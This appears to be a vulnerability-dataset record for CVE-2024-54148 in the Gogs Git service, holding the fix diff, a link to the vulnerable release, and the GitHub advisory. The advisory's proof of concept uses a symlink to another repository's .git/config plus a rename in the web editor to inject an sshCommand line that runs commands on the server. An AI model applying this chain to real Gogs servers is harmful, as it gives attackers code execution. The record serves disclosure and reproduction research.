{
    "CVE-2024-54148": {
        "published_date": "2024-12-23T15:22:48.244Z",
        "patch_commits": [
            {
                "url": "https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a",
                "content": "repo/editor: disallow editing symlink while changing file name (#7857)\n\n## Describe the pull request\n\nLink to the issue: https://github.com/gogs/gogs/issues/7582\n\nFilename: internal/route/repo/editor.go:\n```\n@@ -192,6 +192,7 @@\nfunc editFilePost(c *context.Context, f form.EditRepoFile, isNewFile bool) {\n \t\t\t\treturn\n \t\t\t}\n \t\t} else {\n+\t\t\t// ðŸš¨ SECURITY: Do not allow editing if the target file is a symlink.\n \t\t\tif entry.IsSymlink() {\n \t\t\t\tc.FormErr(\"TreePath\")\n \t\t\t\tc.RenderWithErr(c.Tr(\"repo.editor.file_is_a_symlink\", part), tmplEditorEdit, &f)\n\n@@ -205,7 +206,7 @@\nfunc editFilePost(c *context.Context, f form.EditRepoFile, isNewFile bool) {\n \t}\n \n \tif !isNewFile {\n-\t\t_, err := c.Repo.Commit.TreeEntry(oldTreePath)\n+\t\tentry, err := c.Repo.Commit.TreeEntry(oldTreePath)\n \t\tif err != nil {\n \t\t\tif gitutil.IsErrRevisionNotExist(err) {\n \t\t\t\tc.FormErr(\"TreePath\")\n\n@@ -215,6 +216,14 @@\nfunc editFilePost(c *context.Context, f form.EditRepoFile, isNewFile bool) {\n \t\t\t}\n \t\t\treturn\n \t\t}\n+\n+\t\t// ðŸš¨ SECURITY: Do not allow editing if the old file is a symlink.\n+\t\tif entry.IsSymlink() {\n+\t\t\tc.FormErr(\"TreePath\")\n+\t\t\tc.RenderWithErr(c.Tr(\"repo.editor.file_is_a_symlink\", oldTreePath), tmplEditorEdit, &f)\n+\t\t\treturn\n+\t\t}\n+\n \t\tif lastCommit != c.Repo.CommitID {\n \t\t\tfiles, err := c.Repo.Commit.FilesChangedAfter(lastCommit)\n \t\t\tif err != nil {\n```"
            }
        ],
        "sw_version": "v0.13.1-rc.1",
        "sw_version_wget": "https://github.com/gogs/gogs/archive/refs/tags/v0.13.1-rc.1.zip",
        "description": "Gogs is an open source self-hosted Git service. A malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server. The vulnerability is fixed in 0.13.1.",
        "sec_adv": [
            {
                "url": "https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ngogs\n/\ngogs\nPublic\nNotifications You must be signed in to change notification settings\nFork 5k\nStar 46.4k\nCode\nIssues\n921\nPull requests\n41\nDiscussions\nActions\nSecurity\n20\nInsights\nAdditional navigation options\nPath Traversal in file editing UI\nCritical unknwon published GHSA-r7j8-5h9c-f6fx on Dec 22, 2024Dec 23, 2024\nPackage\ngomod Gogs\n(\nGo\n)\nAffected versions\n<0.13.1\nPatched versions\n0.13.1\nDescription\nImpact\nThe malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server.\nPatches\nEditing symlink while changing the file name has been prohibited via the repository web editor (#7857). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\nWorkarounds\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\nReferences\nn/a\nProof of Concept\nCreate two repositories, upload something to the first repository, edit any file, and save it on the webpage.\nIn the second repository, create a symbolic link to the file you need to edit:\n$ ln -s /data/gogs/data/tmp/local-repo/1/.git/config test\n$ ls -la\ntotal 8\ndrwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .\ndrwxr-xr-x   4 dd  staff  128 Oct 27 19:06 ..\ndrwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git\n-rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md\nlrwxr-xr-x   1 dd  staff   44 Oct 27 19:09 test -> /data/gogs/data/tmp/local-repo/1/.git/config\n$ git add .\n$ git commit -m 'ddd'\n$ git push -f\nGo back to the webpage, edit the symbolic file in the second repository, with the following content, change the filename, and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)\n[core]\nrepositoryformatversion = 0\nfilemode = true\nbare = false\nlogallrefupdates = true\nignorecase = true\nprecomposeunicode = true\nsshCommand = echo pwnned > /tmp/poc\n[remote \"origin\"]\nurl = [git@github.com](mailto:git@github.com):torvalds/linux.git\nfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\nremote = origin\nmerge = refs/heads/master\nGo back to the first repo, edit something, and commit again, you can notice a file called /tmp/poc created on the server.\nFor more information\nIf you have any questions or comments about this advisory, please post on #7582.\nSeverity\nCritical\nCVE ID\nCVE-2024-54148\nWeaknesses\nCWE-20\nCredits\nManassehZhou\nReporter\nFooter\nÂ© 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a detailed step-by-step procedure to replicate the vulnerability, showcasing how the exploit can be performed."
            }
        ],
        "cwe": [
            {
                "id": "CWE-61",
                "value": "CWE-61: UNIX Symbolic Link (Symlink) Following"
            },
            {
                "id": "CWE-22",
                "value": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    }
}